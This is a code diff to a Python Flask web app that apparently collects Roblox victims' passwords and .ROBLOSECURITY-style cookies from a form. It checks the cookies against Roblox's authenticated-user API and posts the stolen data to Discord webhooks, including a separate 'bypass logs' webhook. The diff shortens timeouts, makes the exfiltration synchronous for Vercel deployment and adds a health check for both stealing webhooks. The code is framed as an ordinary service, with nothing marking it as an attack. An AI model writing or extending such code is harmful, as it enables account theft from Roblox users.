@@ -90,7 +90,7 @@ def send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url
         }
         
         # Send to bypass webhook
-        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=10)
+        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
         
         if response.status_code in [200, 204]:
             print(f"Background: Bypass logs webhook successful: {response.status_code}")
@@ -197,7 +197,7 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         payload_size = len(json.dumps(discord_data))
         print(f"Background: Sending Discord payload of size: {payload_size} bytes")
         
-        response = requests.post(webhook_url, json=discord_data, timeout=10)
+        response = requests.post(webhook_url, json=discord_data, timeout=5)
         
         if response.status_code in [200, 204]:
             print(f"Background: Discord webhook successful: {response.status_code}")
@@ -211,7 +211,9 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
                 print("Background: Sending to bypass logs webhook...")
                 send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
             else:
-                print("Background: Bypass webhook URL not configured")
+                print("Background: BYPASS_WEBHOOK_URL environment variable not configured")
+                print("Background: Available webhook env vars:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper()])
+                print("Background: Bypass logs will not be sent - configure BYPASS_WEBHOOK_URL to enable")
         else:
             print("Background: Not sending bypass logs - cookie validation failed")
             
@@ -228,7 +230,7 @@ def get_roblox_user_info(cookie):
         
         # Get current user info
         response = requests.get('https://users.roblox.com/v1/users/authenticated', 
-                              headers=headers, timeout=5)
+                              headers=headers, timeout=3)
         
         if response.status_code == 200:
             user_data = response.json()
@@ -387,7 +389,7 @@ def index():
 
 @app.route('/health')
 def health_check():
-    """Health check endpoint to verify webhook connectivity"""
+    """Health check endpoint to verify main webhook connectivity"""
     webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
     
     if not webhook_url:
@@ -438,6 +440,91 @@ def health_check():
             'message': f'Unexpected error: {str(e)[:100]}'
         }), 500
 
+@app.route('/health/full')
+def health_check_full():
+    """Comprehensive health check for both main and bypass webhooks"""
+    results = {
+        'main_webhook': {'status': 'unknown'},
+        'bypass_webhook': {'status': 'unknown'},
+        'overall_status': 'unknown'
+    }
+    
+    # Test main webhook
+    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+    if not main_webhook_url:
+        results['main_webhook'] = {
+            'status': 'error',
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }
+    else:
+        try:
+            test_payload = {'content': 'Main webhook health check'}
+            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
+            
+            if response.status_code in [200, 204]:
+                results['main_webhook'] = {
+                    'status': 'ok',
+                    'message': 'Main webhook successful',
+                    'status_code': response.status_code
+                }
+            else:
+                results['main_webhook'] = {
+                    'status': 'error',
+                    'message': f'Main webhook failed with status {response.status_code}',
+                    'status_code': response.status_code
+                }
+        except Exception as e:
+            results['main_webhook'] = {
+                'status': 'error',
+                'message': f'Main webhook error: {str(e)[:100]}'
+            }
+    
+    # Test bypass webhook
+    bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
+    if not bypass_webhook_url:
+        results['bypass_webhook'] = {
+            'status': 'warning',
+            'message': 'BYPASS_WEBHOOK_URL not configured - bypass logs will not work'
+        }
+    else:
+        try:
+            test_payload = {'content': 'Bypass webhook health check'}
+            response = requests.post(bypass_webhook_url, json=test_payload, timeout=5)
+            
+            if response.status_code in [200, 204]:
+                results['bypass_webhook'] = {
+                    'status': 'ok',
+                    'message': 'Bypass webhook successful',
+                    'status_code': response.status_code
+                }
+            else:
+                results['bypass_webhook'] = {
+                    'status': 'error',
+                    'message': f'Bypass webhook failed with status {response.status_code}',
+                    'status_code': response.status_code
+                }
+        except Exception as e:
+            results['bypass_webhook'] = {
+                'status': 'error',
+                'message': f'Bypass webhook error: {str(e)[:100]}'
+            }
+    
+    # Determine overall status
+    main_ok = results['main_webhook']['status'] == 'ok'
+    bypass_ok_or_warning = results['bypass_webhook']['status'] in ['ok', 'warning']
+    
+    if main_ok and bypass_ok_or_warning:
+        results['overall_status'] = 'ok'
+        status_code = 200
+    elif main_ok:
+        results['overall_status'] = 'partial'
+        status_code = 200
+    else:
+        results['overall_status'] = 'error'
+        status_code = 500
+    
+    return jsonify(results), status_code
+
 @app.route('/submit', methods=['POST'])
 def submit_form():
     """Handle form submission and send to Discord webhook"""
@@ -474,28 +561,29 @@ def submit_form():
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
         if not webhook_url:
             print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
+            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
             return jsonify({
                 'success': False, 
-                'message': 'Webhook not configured - check environment variables'
+                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
             }), 500
         
         print("Discord webhook URL configured successfully") # Don't log URL for security
         
-        # Start background processing for Discord webhook
-        print("Starting background Discord webhook processing...")
-        background_thread = threading.Thread(
-            target=send_to_discord_background,
-            args=(password, korblox, headless, cookie, webhook_url)
-        )
-        background_thread.daemon = True  # Thread will die when main program exits
-        background_thread.start()
-        
-        # Return immediate success response to user
-        print("Returning immediate success response to user")
-        return jsonify({
-            'success': True, 
-            'message': 'Data received and processing in background'
-        })
+        # Process Discord webhooks synchronously for Vercel compatibility  
+        print("Processing Discord webhooks synchronously...")
+        try:
+            send_to_discord_background(password, korblox, headless, cookie, webhook_url)
+            print("Discord webhook processing completed successfully")
+            return jsonify({
+                'success': True, 
+                'message': 'Data processed and sent successfully'
+            })
+        except Exception as e:
+            print(f"Error during Discord webhook processing: {str(e)}")
+            return jsonify({
+                'success': False, 
+                'message': 'Processing completed but webhook delivery may have failed'
+            }), 500
             
     except Exception as e:
         return jsonify({
